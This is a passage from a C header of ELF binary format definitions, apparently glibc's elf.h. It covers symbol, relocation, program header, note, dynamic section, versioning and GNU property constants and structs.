#define SYMINFO_BT_PARENT	0xfffe	/* Symbol bound to parent */
#define SYMINFO_BT_LOWRESERVE	0xff00	/* Beginning of reserved entries */

/* Possible bitmasks for si_flags.  */
#define SYMINFO_FLG_DIRECT	0x0001	/* Direct bound symbol */
#define SYMINFO_FLG_PASSTHRU	0x0002	/* Pass-thru symbol for translator */
#define SYMINFO_FLG_COPY	0x0004	/* Symbol is a copy-reloc */
#define SYMINFO_FLG_LAZYLOAD	0x0008	/* Symbol bound to object to be lazy
					   loaded */
/* Syminfo version values.  */
#define SYMINFO_NONE		0
#define SYMINFO_CURRENT		1
#define SYMINFO_NUM		2


/* How to extract and insert information held in the st_info field.  */

#define ELF32_ST_BIND(val)		(((unsigned char) (val)) >> 4)
#define ELF32_ST_TYPE(val)		((val) & 0xf)
#define ELF32_ST_INFO(bind, type)	(((bind) << 4) + ((type) & 0xf))

/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */
#define ELF64_ST_BIND(val)		ELF32_ST_BIND (val)
#define ELF64_ST_TYPE(val)		ELF32_ST_TYPE (val)
#define ELF64_ST_INFO(bind, type)	ELF32_ST_INFO ((bind), (type))

/* Legal values for ST_BIND subfield of st_info (symbol binding).  */

#define STB_LOCAL	0		/* Local symbol */
#define STB_GLOBAL	1		/* Global symbol */
#define STB_WEAK	2		/* Weak symbol */
#define	STB_NUM		3		/* Number of defined types.  */
#define STB_LOOS	10		/* Start of OS-specific */
#define STB_GNU_UNIQUE	10		/* Unique symbol.  */
#define STB_HIOS	12		/* End of OS-specific */
#define STB_LOPROC	13		/* Start of processor-specific */
#define STB_HIPROC	15		/* End of processor-specific */

/* Legal values for ST_TYPE subfield of st_info (symbol type).  */

#define STT_NOTYPE	0		/* Symbol type is unspecified */
#define STT_OBJECT	1		/* Symbol is a data object */
#define STT_FUNC	2		/* Symbol is a code object */
#define STT_SECTION	3		/* Symbol associated with a section */
#define STT_FILE	4		/* Symbol\'s name is file name */
#define STT_COMMON	5		/* Symbol is a common data object */
#define STT_TLS		6		/* Symbol is thread-local data object*/
#define	STT_NUM		7		/* Number of defined types.  */
#define STT_LOOS	10		/* Start of OS-specific */
#define STT_GNU_IFUNC	10		/* Symbol is indirect code object */
#define STT_HIOS	12		/* End of OS-specific */
#define STT_LOPROC	13		/* Start of processor-specific */
#define STT_HIPROC	15		/* End of processor-specific */


/* Symbol table indices are found in the hash buckets and chain table
   of a symbol hash table section.  This special index value indicates
   the end of a chain, meaning no further symbols are found in that bucket.  */

#define STN_UNDEF	0		/* End of a chain.  */


/* How to extract and insert information held in the st_other field.  */

#define ELF32_ST_VISIBILITY(o)	((o) & 0x03)

/* For ELF64 the definitions are the same.  */
#define ELF64_ST_VISIBILITY(o)	ELF32_ST_VISIBILITY (o)

/* Symbol visibility specification encoded in the st_other field.  */
#define STV_DEFAULT	0		/* Default symbol visibility rules */
#define STV_INTERNAL	1		/* Processor specific hidden class */
#define STV_HIDDEN	2		/* Sym unavailable in other modules */
#define STV_PROTECTED	3		/* Not preemptible, not exported */


/* Relocation table entry without addend (in section of type SHT_REL).  */

typedef struct
{
  Elf32_Addr	r_offset;		/* Address */
  Elf32_Word	r_info;			/* Relocation type and symbol index */
} Elf32_Rel;

/* I have seen two different definitions of the Elf64_Rel and
   Elf64_Rela structures, so we\'ll leave them out until Novell (or
   whoever) gets their act together.  */
/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */

typedef struct
{
  Elf64_Addr	r_offset;		/* Address */
  Elf64_Xword	r_info;			/* Relocation type and symbol index */
} Elf64_Rel;

/* Relocation table entry with addend (in section of type SHT_RELA).  */

typedef struct
{
  Elf32_Addr	r_offset;		/* Address */
  Elf32_Word	r_info;			/* Relocation type and symbol index */
  Elf32_Sword	r_addend;		/* Addend */
} Elf32_Rela;

typedef struct
{
  Elf64_Addr	r_offset;		/* Address */
  Elf64_Xword	r_info;			/* Relocation type and symbol index */
  Elf64_Sxword	r_addend;		/* Addend */
} Elf64_Rela;

/* RELR relocation table entry */

typedef Elf32_Word	Elf32_Relr;
typedef Elf64_Xword	Elf64_Relr;

/* How to extract and insert information held in the r_info field.  */

#define ELF32_R_SYM(val)		((val) >> 8)
#define ELF32_R_TYPE(val)		((val) & 0xff)
#define ELF32_R_INFO(sym, type)		(((sym) << 8) + ((type) & 0xff))

#define ELF64_R_SYM(i)			((i) >> 32)
#define ELF64_R_TYPE(i)			((i) & 0xffffffff)
#define ELF64_R_INFO(sym,type)		((((Elf64_Xword) (sym)) << 32) + (type))

/* Program segment header.  */

typedef struct
{
  Elf32_Word	p_type;			/* Segment type */
  Elf32_Off	p_offset;		/* Segment file offset */
  Elf32_Addr	p_vaddr;		/* Segment virtual address */
  Elf32_Addr	p_paddr;		/* Segment physical address */
  Elf32_Word	p_filesz;		/* Segment size in file */
  Elf32_Word	p_memsz;		/* Segment size in memory */
  Elf32_Word	p_flags;		/* Segment flags */
  Elf32_Word	p_align;		/* Segment alignment */
} Elf32_Phdr;

typedef struct
{
  Elf64_Word	p_type;			/* Segment type */
  Elf64_Word	p_flags;		/* Segment flags */
  Elf64_Off	p_offset;		/* Segment file offset */
  Elf64_Addr	p_vaddr;		/* Segment virtual address */
  Elf64_Addr	p_paddr;		/* Segment physical address */
  Elf64_Xword	p_filesz;		/* Segment size in file */
  Elf64_Xword	p_memsz;		/* Segment size in memory */
  Elf64_Xword	p_align;		/* Segment alignment */
} Elf64_Phdr;

/* Special value for e_phnum.  This indicates that the real number of
   program headers is too large to fit into e_phnum.  Instead the real
   value is in the field sh_info of section 0.  */

#define PN_XNUM		0xffff

/* Legal values for p_type (segment type).  */

#define	PT_NULL		0		/* Program header table entry unused */
#define PT_LOAD		1		/* Loadable program segment */
#define PT_DYNAMIC	2		/* Dynamic linking information */
#define PT_INTERP	3		/* Program interpreter */
#define PT_NOTE		4		/* Auxiliary information */
#define PT_SHLIB	5		/* Reserved */
#define PT_PHDR		6		/* Entry for header table itself */
#define PT_TLS		7		/* Thread-local storage segment */
#define	PT_NUM		8		/* Number of defined types */
#define PT_LOOS		0x60000000	/* Start of OS-specific */
#define PT_GNU_EH_FRAME	0x6474e550	/* GCC .eh_frame_hdr segment */
#define PT_GNU_STACK	0x6474e551	/* Indicates stack executability */
#define PT_GNU_RELRO	0x6474e552	/* Read-only after relocation */
#define PT_GNU_PROPERTY	0x6474e553	/* GNU property */
#define PT_LOSUNW	0x6ffffffa
#define PT_SUNWBSS	0x6ffffffa	/* Sun Specific segment */
#define PT_SUNWSTACK	0x6ffffffb	/* Stack segment */
#define PT_HISUNW	0x6fffffff
#define PT_HIOS		0x6fffffff	/* End of OS-specific */
#define PT_LOPROC	0x70000000	/* Start of processor-specific */
#define PT_HIPROC	0x7fffffff	/* End of processor-specific */

/* Legal values for p_flags (segment flags).  */

#define PF_X		(1 << 0)	/* Segment is executable */
#define PF_W		(1 << 1)	/* Segment is writable */
#define PF_R		(1 << 2)	/* Segment is readable */
#define PF_MASKOS	0x0ff00000	/* OS-specific */
#define PF_MASKPROC	0xf0000000	/* Processor-specific */

/* Legal values for note segment descriptor types for core files. */

#define NT_PRSTATUS	1		/* Contains copy of prstatus struct */
#define NT_PRFPREG	2		/* Contains copy of fpregset
					   struct.  */
#define NT_FPREGSET	2		/* Contains copy of fpregset struct */
#define NT_PRPSINFO	3		/* Contains copy of prpsinfo struct */
#define NT_PRXREG	4		/* Contains copy of prxregset struct */
#define NT_TASKSTRUCT	4		/* Contains copy of task structure */
#define NT_PLATFORM	5		/* String from sysinfo(SI_PLATFORM) */
#define NT_AUXV		6		/* Contains copy of auxv array */
#define NT_GWINDOWS	7		/* Contains copy of gwindows struct */
#define NT_ASRS		8		/* Contains copy of asrset struct */
#define NT_PSTATUS	10		/* Contains copy of pstatus struct */
#define NT_PSINFO	13		/* Contains copy of psinfo struct */
#define NT_PRCRED	14		/* Contains copy of prcred struct */
#define NT_UTSNAME	15		/* Contains copy of utsname struct */
#define NT_LWPSTATUS	16		/* Contains copy of lwpstatus struct */
#define NT_LWPSINFO	17		/* Contains copy of lwpinfo struct */
#define NT_PRFPXREG	20		/* Contains copy of fprxregset struct */
#define NT_SIGINFO	0x53494749	/* Contains copy of siginfo_t,
					   size might increase */
#define NT_FILE		0x46494c45	/* Contains information about mapped
					   files */
#define NT_PRXFPREG	0x46e62b7f	/* Contains copy of user_fxsr_struct */
#define NT_PPC_VMX	0x100		/* PowerPC Altivec/VMX registers */
#define NT_PPC_SPE	0x101		/* PowerPC SPE/EVR registers */
#define NT_PPC_VSX	0x102		/* PowerPC VSX registers */
#define NT_PPC_TAR	0x103		/* Target Address Register */
#define NT_PPC_PPR	0x104		/* Program Priority Register */
#define NT_PPC_DSCR	0x105		/* Data Stream Control Register */
#define NT_PPC_EBB	0x106		/* Event Based Branch Registers */
#define NT_PPC_PMU	0x107		/* Performance Monitor Registers */
#define NT_PPC_TM_CGPR	0x108		/* TM checkpointed GPR Registers */
#define NT_PPC_TM_CFPR	0x109		/* TM checkpointed FPR Registers */
#define NT_PPC_TM_CVMX	0x10a		/* TM checkpointed VMX Registers */
#define NT_PPC_TM_CVSX	0x10b		/* TM checkpointed VSX Registers */
#define NT_PPC_TM_SPR	0x10c		/* TM Special Purpose Registers */
#define NT_PPC_TM_CTAR	0x10d		/* TM checkpointed Target Address
					   Register */
#define NT_PPC_TM_CPPR	0x10e		/* TM checkpointed Program Priority
					   Register */
#define NT_PPC_TM_CDSCR	0x10f		/* TM checkpointed Data Stream Control
					   Register */
#define NT_PPC_PKEY	0x110		/* Memory Protection Keys
					   registers.  */
#define NT_386_TLS	0x200		/* i386 TLS slots (struct user_desc) */
#define NT_386_IOPERM	0x201		/* x86 io permission bitmap (1=deny) */
#define NT_X86_XSTATE	0x202		/* x86 extended state using xsave */
#define NT_S390_HIGH_GPRS	0x300	/* s390 upper register halves */
#define NT_S390_TIMER	0x301		/* s390 timer register */
#define NT_S390_TODCMP	0x302		/* s390 TOD clock comparator register */
#define NT_S390_TODPREG	0x303		/* s390 TOD programmable register */
#define NT_S390_CTRS	0x304		/* s390 control registers */
#define NT_S390_PREFIX	0x305		/* s390 prefix register */
#define NT_S390_LAST_BREAK	0x306	/* s390 breaking event address */
#define NT_S390_SYSTEM_CALL	0x307	/* s390 system call restart data */
#define NT_S390_TDB	0x308		/* s390 transaction diagnostic block */
#define NT_S390_VXRS_LOW	0x309	/* s390 vector registers 0-15
					   upper half.  */
#define NT_S390_VXRS_HIGH	0x30a	/* s390 vector registers 16-31.  */
#define NT_S390_GS_CB	0x30b		/* s390 guarded storage registers.  */
#define NT_S390_GS_BC	0x30c		/* s390 guarded storage
					   broadcast control block.  */
#define NT_S390_RI_CB	0x30d		/* s390 runtime instrumentation.  */
#define NT_ARM_VFP	0x400		/* ARM VFP/NEON registers */
#define NT_ARM_TLS	0x401		/* ARM TLS register */
#define NT_ARM_HW_BREAK	0x402		/* ARM hardware breakpoint registers */
#define NT_ARM_HW_WATCH	0x403		/* ARM hardware watchpoint registers */
#define NT_ARM_SYSTEM_CALL	0x404	/* ARM system call number */
#define NT_ARM_SVE	0x405		/* ARM Scalable Vector Extension
					   registers */
#define NT_ARM_PAC_MASK	0x406		/* ARM pointer authentication
					   code masks.  */
#define NT_ARM_PACA_KEYS	0x407	/* ARM pointer authentication
					   address keys.  */
#define NT_ARM_PACG_KEYS	0x408	/* ARM pointer authentication
					   generic key.  */
#define NT_ARM_TAGGED_ADDR_CTRL	0x409	/* AArch64 tagged address
					   control.  */
#define NT_ARM_PAC_ENABLED_KEYS	0x40a	/* AArch64 pointer authentication
					   enabled keys.  */
#define NT_VMCOREDD	0x700		/* Vmcore Device Dump Note.  */
#define NT_MIPS_DSP	0x800		/* MIPS DSP ASE registers.  */
#define NT_MIPS_FP_MODE	0x801		/* MIPS floating-point mode.  */
#define NT_MIPS_MSA	0x802		/* MIPS SIMD registers.  */

/* Legal values for the note segment descriptor types for object files.  */

#define NT_VERSION	1		/* Contains a version string.  */


/* Dynamic section entry.  */

typedef struct
{
  Elf32_Sword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf32_Word d_val;			/* Integer value */
      Elf32_Addr d_ptr;			/* Address value */
    } d_un;
} Elf32_Dyn;

typedef struct
{
  Elf64_Sxword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;		/* Integer value */
      Elf64_Addr d_ptr;			/* Address value */
    } d_un;
} Elf64_Dyn;

/* Legal values for d_tag (dynamic entry type).  */

#define DT_NULL		0		/* Marks end of dynamic section */
#define DT_NEEDED	1		/* Name of needed library */
#define DT_PLTRELSZ	2		/* Size in bytes of PLT relocs */
#define DT_PLTGOT	3		/* Processor defined value */
#define DT_HASH		4		/* Address of symbol hash table */
#define DT_STRTAB	5		/* Address of string table */
#define DT_SYMTAB	6		/* Address of symbol table */
#define DT_RELA		7		/* Address of Rela relocs */
#define DT_RELASZ	8		/* Total size of Rela relocs */
#define DT_RELAENT	9		/* Size of one Rela reloc */
#define DT_STRSZ	10		/* Size of string table */
#define DT_SYMENT	11		/* Size of one symbol table entry */
#define DT_INIT		12		/* Address of init function */
#define DT_FINI		13		/* Address of termination function */
#define DT_SONAME	14		/* Name of shared object */
#define DT_RPATH	15		/* Library search path (deprecated) */
#define DT_SYMBOLIC	16		/* Start symbol search here */
#define DT_REL		17		/* Address of Rel relocs */
#define DT_RELSZ	18		/* Total size of Rel relocs */
#define DT_RELENT	19		/* Size of one Rel reloc */
#define DT_PLTREL	20		/* Type of reloc in PLT */
#define DT_DEBUG	21		/* For debugging; unspecified */
#define DT_TEXTREL	22		/* Reloc might modify .text */
#define DT_JMPREL	23		/* Address of PLT relocs */
#define	DT_BIND_NOW	24		/* Process relocations of object */
#define	DT_INIT_ARRAY	25		/* Array with addresses of init fct */
#define	DT_FINI_ARRAY	26		/* Array with addresses of fini fct */
#define	DT_INIT_ARRAYSZ	27		/* Size in bytes of DT_INIT_ARRAY */
#define	DT_FINI_ARRAYSZ	28		/* Size in bytes of DT_FINI_ARRAY */
#define DT_RUNPATH	29		/* Library search path */
#define DT_FLAGS	30		/* Flags for the object being loaded */
#define DT_ENCODING	32		/* Start of encoded range */
#define DT_PREINIT_ARRAY 32		/* Array with addresses of preinit fct*/
#define DT_PREINIT_ARRAYSZ 33		/* size in bytes of DT_PREINIT_ARRAY */
#define DT_SYMTAB_SHNDX	34		/* Address of SYMTAB_SHNDX section */
#define DT_RELRSZ	35		/* Total size of RELR relative relocations */
#define DT_RELR		36		/* Address of RELR relative relocations */
#define DT_RELRENT	37		/* Size of one RELR relative relocaction */
#define	DT_NUM		38		/* Number used */
#define DT_LOOS		0x6000000d	/* Start of OS-specific */
#define DT_HIOS		0x6ffff000	/* End of OS-specific */
#define DT_LOPROC	0x70000000	/* Start of processor-specific */
#define DT_HIPROC	0x7fffffff	/* End of processor-specific */
#define	DT_PROCNUM	DT_MIPS_NUM	/* Most used by any processor */

/* DT_* entries which fall between DT_VALRNGHI & DT_VALRNGLO use the
   Dyn.d_un.d_val field of the Elf*_Dyn structure.  This follows Sun\'s
   approach.  */
#define DT_VALRNGLO	0x6ffffd00
#define DT_GNU_PRELINKED 0x6ffffdf5	/* Prelinking timestamp */
#define DT_GNU_CONFLICTSZ 0x6ffffdf6	/* Size of conflict section */
#define DT_GNU_LIBLISTSZ 0x6ffffdf7	/* Size of library list */
#define DT_CHECKSUM	0x6ffffdf8
#define DT_PLTPADSZ	0x6ffffdf9
#define DT_MOVEENT	0x6ffffdfa
#define DT_MOVESZ	0x6ffffdfb
#define DT_FEATURE_1	0x6ffffdfc	/* Feature selection (DTF_*).  */
#define DT_POSFLAG_1	0x6ffffdfd	/* Flags for DT_* entries, effecting
					   the following DT_* entry.  */
#define DT_SYMINSZ	0x6ffffdfe	/* Size of syminfo table (in bytes) */
#define DT_SYMINENT	0x6ffffdff	/* Entry size of syminfo */
#define DT_VALRNGHI	0x6ffffdff
#define DT_VALTAGIDX(tag)	(DT_VALRNGHI - (tag))	/* Reverse order! */
#define DT_VALNUM 12

/* DT_* entries which fall between DT_ADDRRNGHI & DT_ADDRRNGLO use the
   Dyn.d_un.d_ptr field of the Elf*_Dyn structure.

   If any adjustment is made to the ELF object after it has been
   built these entries will need to be adjusted.  */
#define DT_ADDRRNGLO	0x6ffffe00
#define DT_GNU_HASH	0x6ffffef5	/* GNU-style hash table.  */
#define DT_TLSDESC_PLT	0x6ffffef6
#define DT_TLSDESC_GOT	0x6ffffef7
#define DT_GNU_CONFLICT	0x6ffffef8	/* Start of conflict section */
#define DT_GNU_LIBLIST	0x6ffffef9	/* Library list */
#define DT_CONFIG	0x6ffffefa	/* Configuration information.  */
#define DT_DEPAUDIT	0x6ffffefb	/* Dependency auditing.  */
#define DT_AUDIT	0x6ffffefc	/* Object auditing.  */
#define	DT_PLTPAD	0x6ffffefd	/* PLT padding.  */
#define	DT_MOVETAB	0x6ffffefe	/* Move table.  */
#define DT_SYMINFO	0x6ffffeff	/* Syminfo table.  */
#define DT_ADDRRNGHI	0x6ffffeff
#define DT_ADDRTAGIDX(tag)	(DT_ADDRRNGHI - (tag))	/* Reverse order! */
#define DT_ADDRNUM 11

/* The versioning entry types.  The next are defined as part of the
   GNU extension.  */
#define DT_VERSYM	0x6ffffff0

#define DT_RELACOUNT	0x6ffffff9
#define DT_RELCOUNT	0x6ffffffa

/* These were chosen by Sun.  */
#define DT_FLAGS_1	0x6ffffffb	/* State flags, see DF_1_* below.  */
#define	DT_VERDEF	0x6ffffffc	/* Address of version definition
					   table */
#define	DT_VERDEFNUM	0x6ffffffd	/* Number of version definitions */
#define	DT_VERNEED	0x6ffffffe	/* Address of table with needed
					   versions */
#define	DT_VERNEEDNUM	0x6fffffff	/* Number of needed versions */
#define DT_VERSIONTAGIDX(tag)	(DT_VERNEEDNUM - (tag))	/* Reverse order! */
#define DT_VERSIONTAGNUM 16

/* Sun added these machine-independent extensions in the "processor-specific"
   range.  Be compatible.  */
#define DT_AUXILIARY    0x7ffffffd      /* Shared object to load before self */
#define DT_FILTER       0x7fffffff      /* Shared object to get values from */
#define DT_EXTRATAGIDX(tag)	((Elf32_Word)-((Elf32_Sword) (tag) <<1>>1)-1)
#define DT_EXTRANUM	3

/* Values of `d_un.d_val\' in the DT_FLAGS entry.  */
#define DF_ORIGIN	0x00000001	/* Object may use DF_ORIGIN */
#define DF_SYMBOLIC	0x00000002	/* Symbol resolutions starts here */
#define DF_TEXTREL	0x00000004	/* Object contains text relocations */
#define DF_BIND_NOW	0x00000008	/* No lazy binding for this object */
#define DF_STATIC_TLS	0x00000010	/* Module uses the static TLS model */

/* State flags selectable in the `d_un.d_val\' element of the DT_FLAGS_1
   entry in the dynamic section.  */
#define DF_1_NOW	0x00000001	/* Set RTLD_NOW for this object.  */
#define DF_1_GLOBAL	0x00000002	/* Set RTLD_GLOBAL for this object.  */
#define DF_1_GROUP	0x00000004	/* Set RTLD_GROUP for this object.  */
#define DF_1_NODELETE	0x00000008	/* Set RTLD_NODELETE for this object.*/
#define DF_1_LOADFLTR	0x00000010	/* Trigger filtee loading at runtime.*/
#define DF_1_INITFIRST	0x00000020	/* Set RTLD_INITFIRST for this object*/
#define DF_1_NOOPEN	0x00000040	/* Set RTLD_NOOPEN for this object.  */
#define DF_1_ORIGIN	0x00000080	/* $ORIGIN must be handled.  */
#define DF_1_DIRECT	0x00000100	/* Direct binding enabled.  */
#define DF_1_TRANS	0x00000200
#define DF_1_INTERPOSE	0x00000400	/* Object is used to interpose.  */
#define DF_1_NODEFLIB	0x00000800	/* Ignore default lib search path.  */
#define DF_1_NODUMP	0x00001000	/* Object can\'t be dldump\'ed.  */
#define DF_1_CONFALT	0x00002000	/* Configuration alternative created.*/
#define DF_1_ENDFILTEE	0x00004000	/* Filtee terminates filters search. */
#define	DF_1_DISPRELDNE	0x00008000	/* Disp reloc applied at build time. */
#define	DF_1_DISPRELPND	0x00010000	/* Disp reloc applied at run-time.  */
#define	DF_1_NODIRECT	0x00020000	/* Object has no-direct binding. */
#define	DF_1_IGNMULDEF	0x00040000
#define	DF_1_NOKSYMS	0x00080000
#define	DF_1_NOHDR	0x00100000
#define	DF_1_EDITED	0x00200000	/* Object is modified after built.  */
#define	DF_1_NORELOC	0x00400000
#define	DF_1_SYMINTPOSE	0x00800000	/* Object has individual interposers.  */
#define	DF_1_GLOBAUDIT	0x01000000	/* Global auditing required.  */
#define	DF_1_SINGLETON	0x02000000	/* Singleton symbols are used.  */
#define	DF_1_STUB	0x04000000
#define	DF_1_PIE	0x08000000
#define	DF_1_KMOD       0x10000000
#define	DF_1_WEAKFILTER 0x20000000
#define	DF_1_NOCOMMON   0x40000000

/* Flags for the feature selection in DT_FEATURE_1.  */
#define DTF_1_PARINIT	0x00000001
#define DTF_1_CONFEXP	0x00000002

/* Flags in the DT_POSFLAG_1 entry effecting only the next DT_* entry.  */
#define DF_P1_LAZYLOAD	0x00000001	/* Lazyload following object.  */
#define DF_P1_GROUPPERM	0x00000002	/* Symbols from next object are not
					   generally available.  */

/* Version definition sections.  */

typedef struct
{
  Elf32_Half	vd_version;		/* Version revision */
  Elf32_Half	vd_flags;		/* Version information */
  Elf32_Half	vd_ndx;			/* Version Index */
  Elf32_Half	vd_cnt;			/* Number of associated aux entries */
  Elf32_Word	vd_hash;		/* Version name hash value */
  Elf32_Word	vd_aux;			/* Offset in bytes to verdaux array */
  Elf32_Word	vd_next;		/* Offset in bytes to next verdef
					   entry */
} Elf32_Verdef;

typedef struct
{
  Elf64_Half	vd_version;		/* Version revision */
  Elf64_Half	vd_flags;		/* Version information */
  Elf64_Half	vd_ndx;			/* Version Index */
  Elf64_Half	vd_cnt;			/* Number of associated aux entries */
  Elf64_Word	vd_hash;		/* Version name hash value */
  Elf64_Word	vd_aux;			/* Offset in bytes to verdaux array */
  Elf64_Word	vd_next;		/* Offset in bytes to next verdef
					   entry */
} Elf64_Verdef;


/* Legal values for vd_version (version revision).  */
#define VER_DEF_NONE	0		/* No version */
#define VER_DEF_CURRENT	1		/* Current version */
#define VER_DEF_NUM	2		/* Given version number */

/* Legal values for vd_flags (version information flags).  */
#define VER_FLG_BASE	0x1		/* Version definition of file itself */
#define VER_FLG_WEAK	0x2		/* Weak version identifier */

/* Versym symbol index values.  */
#define	VER_NDX_LOCAL		0	/* Symbol is local.  */
#define	VER_NDX_GLOBAL		1	/* Symbol is global.  */
#define	VER_NDX_LORESERVE	0xff00	/* Beginning of reserved entries.  */
#define	VER_NDX_ELIMINATE	0xff01	/* Symbol is to be eliminated.  */

/* Auxiliary version information.  */

typedef struct
{
  Elf32_Word	vda_name;		/* Version or dependency names */
  Elf32_Word	vda_next;		/* Offset in bytes to next verdaux
					   entry */
} Elf32_Verdaux;

typedef struct
{
  Elf64_Word	vda_name;		/* Version or dependency names */
  Elf64_Word	vda_next;		/* Offset in bytes to next verdaux
					   entry */
} Elf64_Verdaux;


/* Version dependency section.  */

typedef struct
{
  Elf32_Half	vn_version;		/* Version of structure */
  Elf32_Half	vn_cnt;			/* Number of associated aux entries */
  Elf32_Word	vn_file;		/* Offset of filename for this
					   dependency */
  Elf32_Word	vn_aux;			/* Offset in bytes to vernaux array */
  Elf32_Word	vn_next;		/* Offset in bytes to next verneed
					   entry */
} Elf32_Verneed;

typedef struct
{
  Elf64_Half	vn_version;		/* Version of structure */
  Elf64_Half	vn_cnt;			/* Number of associated aux entries */
  Elf64_Word	vn_file;		/* Offset of filename for this
					   dependency */
  Elf64_Word	vn_aux;			/* Offset in bytes to vernaux array */
  Elf64_Word	vn_next;		/* Offset in bytes to next verneed
					   entry */
} Elf64_Verneed;


/* Legal values for vn_version (version revision).  */
#define VER_NEED_NONE	 0		/* No version */
#define VER_NEED_CURRENT 1		/* Current version */
#define VER_NEED_NUM	 2		/* Given version number */

/* Auxiliary needed version information.  */

typedef struct
{
  Elf32_Word	vna_hash;		/* Hash value of dependency name */
  Elf32_Half	vna_flags;		/* Dependency specific information */
  Elf32_Half	vna_other;		/* Unused */
  Elf32_Word	vna_name;		/* Dependency name string offset */
  Elf32_Word	vna_next;		/* Offset in bytes to next vernaux
					   entry */
} Elf32_Vernaux;

typedef struct
{
  Elf64_Word	vna_hash;		/* Hash value of dependency name */
  Elf64_Half	vna_flags;		/* Dependency specific information */
  Elf64_Half	vna_other;		/* Unused */
  Elf64_Word	vna_name;		/* Dependency name string offset */
  Elf64_Word	vna_next;		/* Offset in bytes to next vernaux
					   entry */
} Elf64_Vernaux;


/* Legal values for vna_flags.  */
#define VER_FLG_WEAK	0x2		/* Weak version identifier */


/* Auxiliary vector.  */

/* This vector is normally only used by the program interpreter.  The
   usual definition in an ABI supplement uses the name auxv_t.  The
   vector is not usually defined in a standard <elf.h> file, but it
   can\'t hurt.  We rename it to avoid conflicts.  The sizes of these
   types are an arrangement between the exec server and the program
   interpreter, so we don\'t fully specify them here.  */

typedef struct
{
  uint32_t a_type;		/* Entry type */
  union
    {
      uint32_t a_val;		/* Integer value */
      /* We use to have pointer elements added here.  We cannot do that,
	 though, since it does not work when using 32-bit definitions
	 on 64-bit platforms and vice versa.  */
    } a_un;
} Elf32_auxv_t;

typedef struct
{
  uint64_t a_type;		/* Entry type */
  union
    {
      uint64_t a_val;		/* Integer value */
      /* We use to have pointer elements added here.  We cannot do that,
	 though, since it does not work when using 32-bit definitions
	 on 64-bit platforms and vice versa.  */
    } a_un;
} Elf64_auxv_t;

#include <bits/auxv.h>
/* Note section contents.  Each entry in the note section begins with
   a header of a fixed form.  */

typedef struct
{
  Elf32_Word n_namesz;			/* Length of the note\'s name.  */
  Elf32_Word n_descsz;			/* Length of the note\'s descriptor.  */
  Elf32_Word n_type;			/* Type of the note.  */
} Elf32_Nhdr;

typedef struct
{
  Elf64_Word n_namesz;			/* Length of the note\'s name.  */
  Elf64_Word n_descsz;			/* Length of the note\'s descriptor.  */
  Elf64_Word n_type;			/* Type of the note.  */
} Elf64_Nhdr;

/* Known names of notes.  */

/* Solaris entries in the note section have this name.  */
#define ELF_NOTE_SOLARIS	"SUNW Solaris"

/* Note entries for GNU systems have this name.  */
#define ELF_NOTE_GNU		"GNU"

/* Note entries for freedesktop.org have this name.  */
#define ELF_NOTE_FDO		"FDO"

/* Defined types of notes for Solaris.  */

/* Value of descriptor (one word) is desired pagesize for the binary.  */
#define ELF_NOTE_PAGESIZE_HINT	1


/* Defined note types for GNU systems.  */

/* ABI information.  The descriptor consists of words:
   word 0: OS descriptor
   word 1: major version of the ABI
   word 2: minor version of the ABI
   word 3: subminor version of the ABI
*/
#define NT_GNU_ABI_TAG	1
#define ELF_NOTE_ABI	NT_GNU_ABI_TAG /* Old name.  */

/* Known OSes.  These values can appear in word 0 of an
   NT_GNU_ABI_TAG note section entry.  */
#define ELF_NOTE_OS_LINUX	0
#define ELF_NOTE_OS_GNU		1
#define ELF_NOTE_OS_SOLARIS2	2
#define ELF_NOTE_OS_FREEBSD	3

/* Synthetic hwcap information.  The descriptor begins with two words:
   word 0: number of entries
   word 1: bitmask of enabled entries
   Then follow variable-length entries, one byte followed by a
   \'\0\'-terminated hwcap name string.  The byte gives the bit
   number to test if enabled, (1U << bit) & bitmask.  */
#define NT_GNU_HWCAP	2

/* Build ID bits as generated by ld --build-id.
   The descriptor consists of any nonzero number of bytes.  */
#define NT_GNU_BUILD_ID	3

/* Version note generated by GNU gold containing a version string.  */
#define NT_GNU_GOLD_VERSION	4

/* Program property.  */
#define NT_GNU_PROPERTY_TYPE_0 5

/* Packaging metadata as defined on
   https://systemd.io/COREDUMP_PACKAGE_METADATA/ */
#define NT_FDO_PACKAGING_METADATA 0xcafe1a7e

/* Note section name of program property.   */
#define NOTE_GNU_PROPERTY_SECTION_NAME ".note.gnu.property"

/* Values used in GNU .note.gnu.property notes (NT_GNU_PROPERTY_TYPE_0).  */

/* Stack size.  */
#define GNU_PROPERTY_STACK_SIZE			1
/* No copy relocation on protected data symbol.  */
#define GNU_PROPERTY_NO_COPY_ON_PROTECTED	2

/* A 4-byte unsigned integer property: A bit is set if it is set in all
   relocatable inputs.  */
#define GNU_PROPERTY_UINT32_AND_LO	0xb0000000
#define GNU_PROPERTY_UINT32_AND_HI	0xb0007fff

/* A 4-byte unsigned integer property: A bit is set if it is set in any
   relocatable inputs.  */
#define GNU_PROPERTY_UINT32_OR_LO	0xb0008000
#define GNU_PROPERTY_UINT32_OR_HI	0xb000ffff

/* The needed properties by the object file.  */
#define GNU_PROPERTY_1_NEEDED		GNU_PROPERTY_UINT32_OR_LO

/* Set if the object file requires canonical function pointers and
   cannot be used with copy relocation.  */
#define GNU_PROPERTY_1_NEEDED_INDIRECT_EXTERN_ACCESS (1U << 0)

/* Processor-specific semantics, lo */
#define GNU_PROPERTY_LOPROC			0xc0000000
/* Processor-specific semantics, hi */
#define GNU_PROPERTY_HIPROC			0xdfffffff
/* Application-specific semantics, lo */
#define GNU_PROPERTY_LOUSER			0xe0000000
/* Application-specific semantics, hi */
#define GNU_PROPERTY_HIUSER			0xffffffff

/* AArch64 specific GNU properties.  */
#define GNU_PROPERTY_AARCH64_FEATURE_1_AND	0xc0000000

#define GNU_PROPERTY_AARCH64_FEATURE_1_BTI	(1U << 0)
#define GNU_PROPERTY_AARCH64_FEATURE_1_PAC	(1U << 1)

/* The x86 instruction sets indicated by the corresponding bits are
   used in program.  Their support in the hardware is optional.  */
#define GNU_PROPERTY_X86_ISA_1_USED		0xc0010002
/* The x86 instruction sets indicated by the corresponding bits are
   used in program and they must be supported by the hardware.   */
#define GNU_PROPERTY_X86_ISA_1_NEEDED		0xc0008002
/* X86 processor-specific features used in program.  */
#define GNU_PROPERTY_X86_FEATURE_1_AND		0xc0000002

